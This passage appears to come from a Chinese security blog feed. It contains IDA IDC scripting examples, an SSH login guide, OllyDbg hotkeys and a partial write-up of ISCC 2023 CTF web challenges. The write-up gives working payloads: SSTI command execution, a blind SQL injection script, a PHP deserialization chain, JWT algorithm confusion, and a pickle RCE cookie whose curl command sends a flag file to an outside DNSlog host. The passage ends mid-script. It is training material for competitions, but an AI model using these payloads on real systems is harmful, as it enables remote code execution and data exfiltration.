<h6 id="反汇编函数："><a href="#反汇编函数：" class="headerlink" title="反汇编函数："></a>反汇编函数：</h6><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;idc.idc&gt;</span></span>

<span class="hljs-type">static</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
<span class="hljs-comment">// 索索特征码</span>
    <span class="hljs-keyword">auto</span> code = FindBinary(<span class="hljs-number">0x401020</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;55 8B EC&quot;</span>);
    Message(<span class="hljs-string">&quot;%x \n&quot;</span>,code);


    <span class="hljs-comment">// 反汇反汇编代码</span>
    code = GetDisasm(<span class="hljs-number">0x401000</span>);
    Message(<span class="hljs-string">&quot;%s \n&quot;</span>,code);
    
    <span class="hljs-comment">// 反汇 位于地址处的指令</span>
    code = GetMnem(<span class="hljs-number">0x401000</span>);
    Message(<span class="hljs-string">&quot;%s \n&quot;</span>,code);
    
    <span class="hljs-comment">// 反汇opcode</span>
    code = GetOpnd(<span class="hljs-number">0x401070</span>,<span class="hljs-number">0</span>);
    Message(<span class="hljs-string">&quot;%s \n&quot;</span>,code);
&#125;
</code></pre>
<h6 id="枚举函数（枚举栈帧）"><a href="#枚举函数（枚举栈帧）" class="headerlink" title="枚举函数（枚举栈帧）"></a>枚举函数（枚举栈帧）</h6><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;idc.idc&gt;</span></span>

<span class="hljs-type">static</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
    <span class="hljs-keyword">auto</span> addr,args,end,locals,frame,firstArg,name,ret;
    
    <span class="hljs-keyword">for</span>(addr = NextFunction(addr); addr != BADADDR; addr = NextFunction(addr))
    &#123;
        name = Name(addr);
        end = GetFunctionAttr(addr,FUNCATTR_END);
        locals = GetFunctionAttr(addr,FUNCATTR_FRSIZE);
        <span class="hljs-comment">// 得到栈帧大小</span>
        frame = GetFrame(addr);
        <span class="hljs-comment">// 栈中保存返回地址偏移量</span>
        ret = GetMemberOffset(frame,<span class="hljs-string">&quot; r&quot;</span>);
        <span class="hljs-keyword">if</span>(ret == <span class="hljs-number">-1</span>)<span class="hljs-keyword">continue</span>;
        firstArg = ret +<span class="hljs-number">4</span>;
        args = GetStrucSize(frame) - firstArg;
        Message(<span class="hljs-string">&quot;函数: %s 开始: 0x%x 结束: 0x%x 大小: %d bytes 栈帧: %d bytes (%d args) \n&quot;</span>,name,addr,end,locals,args,args/<span class="hljs-number">4</span>);
    &#125;
&#125;
</code></pre>
<h6 id="检索交叉引用（全部）："><a href="#检索交叉引用（全部）：" class="headerlink" title="检索交叉引用（全部）："></a>检索交叉引用（全部）：</h6><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;idc.idc&gt;</span></span>

<span class="hljs-type">static</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
    <span class="hljs-keyword">auto</span> func,end,target,inst,name,flags,xref;
    
    flags = SEARCH_DOWN | SEARCH_NEXT;
    
    func = GetFunctionAttr(ScreenEA(),FUNCATTR_START);
    
    <span class="hljs-keyword">if</span>(func != <span class="hljs-number">-1</span>)
    &#123;
        name =Name(func);
        end = GetFunctionAttr(func,FUNCATTR_END);
        <span class="hljs-keyword">for</span>(inst = func;inst &lt; end; inst = FindCode(inst,flags))
        &#123;
            <span class="hljs-keyword">for</span>(target = Rfirst(inst);target != BADADDR; target = Rnext(inst,target))
            &#123;
                xref = XrefType();
                <span class="hljs-keyword">if</span>(xref == fl_CN || xref == fl_CF)
                &#123;
                    Message(<span class="hljs-string">&quot;%s call -&gt; %sfrom --&gt; %x \n&quot;</span>,name,Name(target),inst);
                &#125;
            &#125;
        &#125;
    &#125;
&#125;
</code></pre>

]]></content>
  </entry>
  <entry>
    <title>Linux 系统实现 SSH 连接的 3 种 方式</title>
    <url>/2023/02/23/Linux%E7%B3%BB%E7%BB%9F%E5%AE%9E%E7%8E%B0SSH%E8%BF%9E%E6%8E%A5%E7%9A%843%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<p>Linux 系统实现 SSH 连接的 3 种 方式<br>密码登入<br>公钥登入<br>私钥登入<br>登入前提<br>服务端安装好 ssh 服务, openssh-server<br>客户端与服务器端均要拥有 ssh-key，可以使用命令 ls ~/.ssh/ 来查看是否拥有 id_rsa 与 id_rsa.pub 文件，如果没有同时拥有这两个文件，那就执行命令ssh-keygen并持续按回车键生成它们<br>前提假设 ：客户端 A 远程连接服务端 B，A 的 IP 等于10.10.10.104，B 的 IP 等于172.19.0.2</p>
<h4 id="方式一：密码登入"><a href="#方式一：密码登入" class="headerlink" title="方式一：密码登入"></a>方式一：密码登入</h4><p>原理：执行远程连接命令并输入账号密码</p>
<p>客户端 A 连接服务端 B，客户端 A 中执行命令 ssh <a href="mailto:&#x72;&#111;&#x6f;&#x74;&#x40;&#x31;&#x37;&#x32;&#x2e;&#49;&#x39;&#x2e;&#48;&#x2e;&#50;">&#x72;&#111;&#x6f;&#x74;&#x40;&#x31;&#x37;&#x32;&#x2e;&#49;&#x39;&#x2e;&#48;&#x2e;&#50;</a> 去连接 B。命令中的 root 是服务端 B 的用户名<br>接着就是输入密码即可</p>
<h4 id="方式二：公钥登入（免密登入）"><a href="#方式二：公钥登入（免密登入）" class="headerlink" title="方式二：公钥登入（免密登入）"></a>方式二：公钥登入（免密登入）</h4><p>原理：注入公钥到服务端，表示拥有该公钥的客户端可以免密登入</p>
<p>将客户端 A 的公钥<del>/.ssh/id_rsa.pub复制到服务端 B 的授权Key文件</del>/.ssh/authorized_keys中。可采用手动方式，也可以在客户端 A 执行命令 ssh-copy-id <a href="mailto:&#114;&#111;&#x6f;&#x74;&#x40;&#49;&#55;&#x32;&#x2e;&#49;&#x39;&#46;&#x30;&#46;&#50;">&#114;&#111;&#x6f;&#x74;&#x40;&#49;&#55;&#x32;&#x2e;&#49;&#x39;&#46;&#x30;&#46;&#50;</a>来实现<br>在客户端 A 执行命令 ssh 172.19.0.2 即可实现免密登入</p>
<h4 id="方式三：秘钥文件登入"><a href="#方式三：秘钥文件登入" class="headerlink" title="方式三：秘钥文件登入"></a>方式三：秘钥文件登入</h4><p>原理：客户端每次登入时携带服务端秘钥来登入</p>
<p>将服务端 B 的私钥<del>/.ssh/id_rsa复制到客户端 A 中，假设放在</del>/.ssh/b_id_rsa，并修改权限为只读。在客户端 A 中执行命令chmod 400 ~/.ssh/b_id_rsa来修改权限<br>在客户端 A 执行命令 ssh -i ~/.ssh/b_id_rsa <a href="mailto:&#x72;&#x6f;&#x6f;&#116;&#x40;&#x31;&#55;&#x32;&#x2e;&#49;&#57;&#x2e;&#x30;&#46;&#50;">&#x72;&#x6f;&#x6f;&#116;&#x40;&#x31;&#55;&#x32;&#x2e;&#49;&#57;&#x2e;&#x30;&#46;&#50;</a> 即可实现登入<br>提示：<br>如果服务端 B 的 ssh 服务所监听的端口不是 22 ，假如是 33，那么在客户端 A 连接时，需要加上 -p 33 来连接。比如：ssh -p 33 <a href="mailto:&#114;&#111;&#x6f;&#x74;&#x40;&#49;&#55;&#50;&#46;&#x31;&#57;&#x2e;&#48;&#46;&#50;">&#114;&#111;&#x6f;&#x74;&#x40;&#49;&#55;&#50;&#46;&#x31;&#57;&#x2e;&#48;&#46;&#50;</a></p>
]]></content>
  </entry>
  <entry>
    <title>OllyDbg 常用快捷热键</title>
    <url>/2023/02/23/OllyDbg%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E7%83%AD%E9%94%AE/</url>
    <content><![CDATA[<h2 id="OllyDbg-常用快捷热键"><a href="#OllyDbg-常用快捷热键" class="headerlink" title="OllyDbg 常用快捷热键"></a>OllyDbg 常用快捷热键</h2><p>打开一个新的可执行程序 (F3)</p>
<p>重新运行当前调试的程序 (Ctrl+F2)</p>
<p>当前调试的程序 (Alt+F2)</p>
<p>运行选定的程序进行调试 (F9)</p>
<p>暂时停止被调试程序的执行 (F12)</p>
<p>单步进入被调试程序的 Call 中 (F7)</p>
<p>步过被调试程序的 Call (F8)</p>
<p>跟入被调试程序的 Call 中 (Ctrl+F11)</p>
<p>跟踪时跳过被调试程序的 Call (Ctrl+F12)</p>
<p>执行直到返回 (Ctrl+F9)</p>
<p>显示记录窗口 (Alt+L)</p>
<p>显示模块窗口 (Alt+E)</p>
<p>显示内存窗口 (Alt+M)</p>
<p>显示 CPU 窗口 (Alt+C)</p>
<p>显示补丁窗口 (Ctrl+P)</p>
<p>显示呼叫堆栈 (Alt+K)</p>
<p>显示断点窗口 (Alt+B)</p>
<p>打开调试选项窗口 (Alt+O)</p>
]]></content>
  </entry>
  <entry>
    <title>2023线上ISCC部分WP</title>
    <url>/2023/11/14/2023%E7%BA%BF%E4%B8%8AISCC%20%E9%83%A8%E5%88%86WP/</url>
    <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="羊了个羊"><a href="#羊了个羊" class="headerlink" title="羊了个羊"></a>羊了个羊</h2><p>通过网址打开游戏界面，发现鼠标右键失灵，无法直接打开页面源代码。随意打开一个已知页面的源代码，发现有view-source:字样，在游戏界面的网址前加上view-sourc:打开页面源代码。<br>发现一串字符使用base64加密<img src="https://img-blog.csdnimg.cn/bc4c711ae33746fc9afd935487e7a1aa.png#pic_center" alt="在这里插入图片描述"><br>解密后是个假的flag<br><img src="https://img-blog.csdnimg.cn/7b92de71c5774fb68e5994e76aad722d.png#pic_center" alt="在这里插入图片描述"><br>有两个可打开文件，flag肯定在这两个中<br>打开index.css文件未发现任何东西<br>故接着打开另一个vue.global.js文件，文件内容很多，快捷键Ctrl+F全局搜索，发现base64字符串<br><img src="https://img-blog.csdnimg.cn/1bde4f5d6ba64a06ac5bab6fe6fe2b31.png#pic_center" alt="在这里插入图片描述"><br>经过两次base64解密得到正确的flag</p>
<h2 id="小周的密码锁"><a href="#小周的密码锁" class="headerlink" title="小周的密码锁"></a>小周的密码锁</h2><p>打开，按照规律多次尝试<br><img src="https://img-blog.csdnimg.cn/3ccea68945aa42f2a604094e3146623e.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/5235ca29bf884f2ba47c2c0eb1de24a1.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/484a705e6eab4d679cd6dcc6e45755ad.png#pic_center" alt="在这里插入图片描述"><br>发现后面的password2不会变，将其值改成5，得到代码<br><img src="https://img-blog.csdnimg.cn/e9c6e6c6996c42528caa991e9d8866b9.png#pic_center" alt="在这里插入图片描述"><br>发现有部分被遮挡，网页代码复制下来<br>构造payload：<br><a href="http://47.94.14.162:10008/?password=%02!SCCNOTHARD&amp;username=14987637&amp;sha1=ncxvshadewjpz&amp;%E2%80%AE%E2%81%A6//sha2%E2%81%A9%E2%81%A6sha2=DFSNHPICAKYWV">http://47.94.14.162:10008/?password=%02!SCCNOTHARD&amp;username=14987637&amp;sha1=ncxvshadewjpz&amp;%E2%80%AE%E2%81%A6//sha2%E2%81%A9%E2%81%A6sha2=DFSNHPICAKYWV</a><br>得到结果</p>
<h2 id="老狼老狼几点了"><a href="#老狼老狼几点了" class="headerlink" title="老狼老狼几点了"></a>老狼老狼几点了</h2><p><img src="https://img-blog.csdnimg.cn/80e1da30985a4fd693dee6d3fe018bcb.png" alt="在这里插入图片描述"><br>首先跑出来是12点，跳转到guess_time.php文件去<br>接着审计代码第一步可以通过爆破未来值得到，提前用fastcoll生成两个以未来时间戳开头的相同md5的值<br><img src="https://img-blog.csdnimg.cn/fc1f582c1e1a4df5920aefea363d5163.png" alt="在这里插入图片描述"></p>
<pre><code class="hljs bash"><span class="hljs-variable">$a</span> = (file_get_contents(<span class="hljs-string">&quot;D:/WebApps/fastcoll/a1.txt&quot;</span>));
<span class="hljs-variable">$b</span> = (file_get_contents(<span class="hljs-string">&quot;D:/WebApps/fastcoll/a2.txt&quot;</span>));
<span class="hljs-built_in">echo</span> urlencode(<span class="hljs-variable">$a</span>).<span class="hljs-string">&quot;&quot;</span>;
<span class="hljs-built_in">echo</span> urlencode(<span class="hljs-variable">$b</span>).<span class="hljs-string">&quot;&quot;</span>;</code></pre>
<p><img src="https://img-blog.csdnimg.cn/8f85a05ee77c476bb1dac7dccd5c8a8e.png" alt="在这里插入图片描述"><br>接着extract变量覆盖绕过，可以看到这里的file和function的值是无法绕过的，但是我们可以通过base64过滤进行字符串逃逸，具体原理也比较简单<br>逃逸的payload：</p>
<pre><code class="hljs bash">_SESSION[a]=base64base64base64&amp;_SESSION[z]=a<span class="hljs-string">&quot;;s:8:&quot;</span><span class="hljs-keyword">function</span><span class="hljs-string">&quot;;s:4:&quot;</span>hack<span class="hljs-string">&quot;;s:4:&quot;</span>file<span class="hljs-string">&quot;;s:52:&quot;</span>php://filter/convert.basbase64e64-encode/resource=flag.php<span class="hljs-string">&quot;;s:4:&quot;</span>snow<span class="hljs-string">&quot;;s:4:&quot;</span>snow<span class="hljs-string">&quot;;&#125;</span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/2e6d0372825b4827be6b61b76f1f289b.png" alt="在这里插入图片描述"></p>
<h2 id="ChatGGG"><a href="#ChatGGG" class="headerlink" title="ChatGGG"></a>ChatGGG</h2><pre><code class="hljs plaintext">1. 发现fllaaag.txt
2. 网络响应发现服务端为WSGI，猜测有模板注入
3. 测试过滤内容：
    &#123;&#123;&#125;&#125;不能用
    使用&#123;%print()%&#125;
4. 输入&#123;%print(config)%&#125;查看配置
5. 构造payload
  (1)+.*_ class base globals等一大部分都被过滤了
  (2)~可以充当连接，使用&quot;&quot;[&quot;&quot;]代替.__
  (3)&#123;%print(&quot;&quot;[&quot;\x5f\x5fcla&quot;~&quot;ss\x5f\x5f&quot;][&quot;\x5F\x5Fba&quot;~&quot;se\x5F\x5F&quot;][&quot;\x5F\x5Fsubcla&quot;~&quot;sses\x5F\x5F&quot;]()[233][&quot;\x5F\x5Fin&quot;~&quot;it\x5F\x5F&quot;][&quot;\x5F\x5Fglo&quot;~&quot;bals\x5F\x5F&quot;][&quot;\x5F\x5Fbuil&quot;~&quot;tins\x5F\x5F&quot;][&quot;eval&quot;](&quot;\x5F\x5Fimpo&quot;~&quot;rt\x5F\x5F(\&quot;os\&quot;)&quot;)[&quot;popen&quot;](&quot;cat flllaag\x2etxt|bas&quot;~&quot;e64&quot;)[&quot;read&quot;]())%&#125;
  其中&quot;&quot;[&quot;\x5f\x5fcla&quot;~&quot;ss\x5f\x5f&quot;]=&gt;&quot;&quot;[&quot;__class__&quot;]=&gt;.__class__</code></pre>

<h2 id="ISCC疯狂购物节-1"><a href="#ISCC疯狂购物节-1" class="headerlink" title="ISCC疯狂购物节-1"></a>ISCC疯狂购物节-1</h2><p>此题考查的是like盲注<br>poc:</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time

url = <span class="hljs-string">&quot;http://47.94.14.162:10001/Details/search?id=&quot;</span>
cookies = &#123;&#125; <span class="hljs-comment">#换自己的</span>
headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://47.94.14.162:10001/Details/search?id=487561)||database()%20like%200x254325--%20-&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;X-Requested-With&quot;</span>: <span class="hljs-string">&quot;XMLHttpRequest&quot;</span>&#125;

chars=<span class="hljs-string">&#x27;&#123;&#125;.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>
<span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> chars:
   payload=<span class="hljs-string">&quot;4875610)||fl4g like binary 0x257b&#123;0&#125;25#&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(char))[<span class="hljs-number">2</span>:])	<span class="hljs-comment">#改这里</span>
   <span class="hljs-built_in">print</span>(payload)
   time.sleep(<span class="hljs-number">2</span>)
   res=requests.get(url+payload, headers=headers, cookies=cookies)
   <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;fl4g&quot;</span> <span class="hljs-keyword">in</span> res.text:
      <span class="hljs-built_in">print</span>(char)
</code></pre>
<h2 id="Where-is-your-love"><a href="#Where-is-your-love" class="headerlink" title="Where_is_your_love"></a>Where_is_your_love</h2><p>F12控制台查看可找到loveStory.php  Enc.php download.php，loveStory.php为反序列源码。<br>boy::__destruct() –&gt;girl()::__call()–&gt;helper()::__isset()–&gt;boy()::__toString()–&gt;helper()::__get()–&gt;love_story()::__love()<br>在get()处使用数组调用类方法执行love函数。<br>传入</p>
<pre><code class="hljs php"><span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">love_story</span>(),<span class="hljs-string">&quot;love&quot;</span>)</code></pre>
<p>其中，love_story中使fall_in_love=[“girl_and_boy”]绕过if判断<br>poc:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">boy</span> </span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$like</span>;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">girl</span> </span>&#123;
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$boyname</span>;
        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$boyname</span></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-variable language_">$this</span>-&gt;boyname=<span class="hljs-variable">$boyname</span>;
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$string</span></span>) </span>&#123;
        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">string</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;string&quot;</span>=&gt;<span class="hljs-variable">$string</span>);
    &#125;
&#125;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">love_story</span> </span>&#123;
&#125;


<span class="hljs-variable">$boy2</span>=<span class="hljs-keyword">new</span> boy;
<span class="hljs-variable">$love1</span>=<span class="hljs-keyword">new</span> love_story;
<span class="hljs-variable">$love1</span>-&gt;fall_in_love=[<span class="hljs-string">&quot;girl_and_boy&quot;</span>];
<span class="hljs-variable">$help2</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">helper</span>(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-variable">$love1</span>,<span class="hljs-string">&quot;love&quot;</span>));
<span class="hljs-variable">$boy2</span>-&gt;like=<span class="hljs-variable">$help2</span>;
<span class="hljs-variable">$help1</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">helper</span>(<span class="hljs-variable">$boy2</span>,<span class="hljs-string">&quot;dd&quot;</span>);
<span class="hljs-variable">$girl1</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">girl</span>(<span class="hljs-variable">$help1</span>);
<span class="hljs-variable">$boy1</span>=<span class="hljs-keyword">new</span> boy;
<span class="hljs-variable">$boy1</span>-&gt;like=<span class="hljs-variable">$girl1</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$boy1</span>));</code></pre>
<p>后面还有段解密<br><img src="https://img-blog.csdnimg.cn/084c4d24941d4f62a85d4c0fc173b202.png#pic_center" alt="在这里插入图片描述"></p>
<h2 id="上大号说话"><a href="#上大号说话" class="headerlink" title="上大号说话"></a>上大号说话</h2><p>.git 泄露部分源码</p>
<pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ED</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.file_key = ...  <span class="hljs-comment"># 1Aa 需要爆破的key</span>
        self.cipher_suite = Fernet(self.generate_key(self.file_key))    <span class="hljs-comment">#</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">crypto</span>(<span class="hljs-params">self, base_str</span>):
        <span class="hljs-keyword">return</span> self.cipher_suite.encrypt(base_str)

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_key</span>(<span class="hljs-params">key: <span class="hljs-built_in">str</span></span>):
        key_byte = key.encode()
        <span class="hljs-keyword">return</span> base64.urlsafe_b64encode(key_byte + <span class="hljs-string">b&#x27;0&#x27;</span> * <span class="hljs-number">28</span>)


<span class="hljs-keyword">def</span> <span class="hljs-title function_">check_cookies</span>(<span class="hljs-params">cookie</span>):
    ed = ED()
    f, result = ed.decrypto(cookie)
    black_list = ...
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>] == <span class="hljs-string">b&#x27;\x80\x03&#x27;</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    ...
    <span class="hljs-keyword">try</span>:
        result = pickle.loads(result)
        <span class="hljs-keyword">if</span> result.name == <span class="hljs-string">&#x27;mabaoguo&#x27;</span> <span class="hljs-keyword">and</span> result.random == mabaoguo.random <span class="hljs-keyword">and</span> result.gongfu == mabaoguo.gongfu:
            <span class="hljs-keyword">return</span> flag
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> result.name
    <span class="hljs-keyword">except</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>


<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():
    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:
        name = request.form[<span class="hljs-string">&#x27;input_field&#x27;</span>]
        name = Member(name)
        name_pick = pickle.dumps(name, protocol=<span class="hljs-number">3</span>)
        name_pick = pickletools.optimize(name_pick)
        ed = ED()
        response = make_response(redirect(<span class="hljs-string">&#x27;/&#x27;</span>))
        response.set_cookie(<span class="hljs-string">&#x27;name&#x27;</span>, ed.crypto(name_pick).decode())
        <span class="hljs-keyword">return</span> response

    temp_cookies = request.cookies.get(<span class="hljs-string">&#x27;name&#x27;</span>)

    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> temp_cookies:
        ...
    <span class="hljs-keyword">else</span>:
        f = check_cookies(temp_cookies)
        ...


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    app.run()</code></pre>
<p>爆破密钥：<br>先在题目随便输入，再获得name对应的cookie<br>爆破脚本，字典为自己生成（数字+大小写字母组合），从短的开始</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> cryptography.fernet <span class="hljs-keyword">import</span> Fernet
<span class="hljs-keyword">import</span> base64

<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_key</span>(<span class="hljs-params">key: <span class="hljs-built_in">str</span></span>):
    key_byte = key.encode()
    <span class="hljs-keyword">return</span> base64.urlsafe_b64encode(key_byte + <span class="hljs-string">b&#x27;0&#x27;</span> * <span class="hljs-number">28</span>)
se=<span class="hljs-string">&quot;gAAAAABkV15w1YrpamSHnPltzjwB95JFnf-3G39PwVGEHn3bjIIq47b5R2GnjsCzdoNsXiz8dw-1zstfOR8Jpwl0xmem3AnaClnFyww3_aCI4SHEukDek6B2716T_tb-RW1a9Th0MTapMmawkgoQfRSAV6uGreqgHzKxmHqdAMoyxsRrMAAEpo4=&quot;</span>
dic=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;dic.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).readlines()
times=<span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:
    <span class="hljs-keyword">try</span>:
        key=generate_key(i.strip())
        fernet=Fernet(key)
        data=fernet.decrypt(se)
        times+=<span class="hljs-number">1</span>
        <span class="hljs-built_in">print</span>(data)
        <span class="hljs-built_in">print</span>(i)
        <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">except</span>:
        <span class="hljs-keyword">pass</span>
<span class="hljs-built_in">print</span>(times)
</code></pre>
<p>密钥：5MbG<br>再生成O指令RCE的cookie<br>poc：</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">from</span> json <span class="hljs-keyword">import</span> dump
<span class="hljs-keyword">from</span> enum <span class="hljs-keyword">import</span> member
<span class="hljs-keyword">from</span> cryptography.fernet <span class="hljs-keyword">import</span> Fernet

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ED</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.file_key = <span class="hljs-string">&#x27;5MbG&#x27;</span>
        self.cipher_suite = Fernet(self.generate_key(self.file_key))

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">crypto</span>(<span class="hljs-params">self, base_str</span>):
        <span class="hljs-keyword">return</span> self.cipher_suite.encrypt(base_str)
        
<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_key</span>(<span class="hljs-params">key: <span class="hljs-built_in">str</span></span>):
        key_byte = key.encode()
        <span class="hljs-keyword">return</span> base64.urlsafe_b64encode(key_byte + <span class="hljs-string">b&#x27;0&#x27;</span> * <span class="hljs-number">28</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;curl `cat flagucjbgaxqef.txt`.l8s7sjd8.dnslog.pw&#x27;</span>)))
payload = <span class="hljs-string">b&#x27;\x80\x03(cos\nsystem\nX\x30\x00\x00\x00curl `cat flagucjbgaxqef.txt`.l8s7sjd8.dnslog.pwo.&#x27;</span>
payload1=<span class="hljs-string">b&#x27;\x80\x03capp\nMember\n)\x81&#125;(X\x04\x00\x00\x00nameX\x08\x00\x00\x00mabaoguoX\x06\x00\x00\x00randomcmabaoguo\nrandom\nX\x06\x00\x00\x00gongfucmabaoguo\ngongfu\nub.&#x27;</span>
<span class="hljs-comment">#flagucjbgaxqef.txt</span>
ed = ED()
cookie=ed.crypto(payload).decode()
<span class="hljs-built_in">print</span>(cookie)</code></pre>
<p>payload1为变量覆盖，获取flag的位置，payload为获取flag，payload中的DNSlog记得换为自己的。换上cookie刷新即可，在DNSlog等待回显，没有回显多尝试几次。</p>
<h2 id="ISCC内部零元购-2"><a href="#ISCC内部零元购-2" class="headerlink" title="ISCC内部零元购-2"></a>ISCC内部零元购-2</h2><p>题目漏洞为ssti模板注入，下载公钥文件，修改RS256为HS256，密钥混淆。</p>
<pre><code class="hljs sql">import jwt
      PUBLIC_KEY <span class="hljs-operator">=</span> <span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;key.txt&#x27;</span>).read()
      payload <span class="hljs-operator">=</span> &#123;
        &quot;name&quot;: &quot;&#123;&#123;cycler.__init__.__globals__.os.popen(&#x27;cat flag.txt&#x27;).read()&#125;&#125;&quot;,
        &quot;exp&quot;: <span class="hljs-number">9902085613</span>,  #失效时间，随便写就好
      &#125;
      header <span class="hljs-operator">=</span> &#123;
        &quot;Access_IP&quot;:&quot;10.15.6.211&quot;,
        &quot;alg&quot;: &quot;HS256&quot;,
        &quot;typ&quot;: &quot;JWT&quot;,
      &#125;
      encoded <span class="hljs-operator">=</span> jwt.encode(payload, PUBLIC_KEY, algorithm<span class="hljs-operator">=</span><span class="hljs-string">&#x27;HS256&#x27;</span>, headers<span class="hljs-operator">=</span>header)
      print(encoded)</code></pre>

<p>替换cookie中Auth值，并访问inner（内部商店）获取flag</p>
<h2 id="ISCC滥用职权-3"><a href="#ISCC滥用职权-3" class="headerlink" title="ISCC滥用职权-3"></a>ISCC滥用职权-3</h2><p>登录策划部，bp抓包修改大写字母，写脚本利用CBC反转来绕过认证。</p>
<pre><code class="hljs sql">import base64
import requests
import urllib.parse
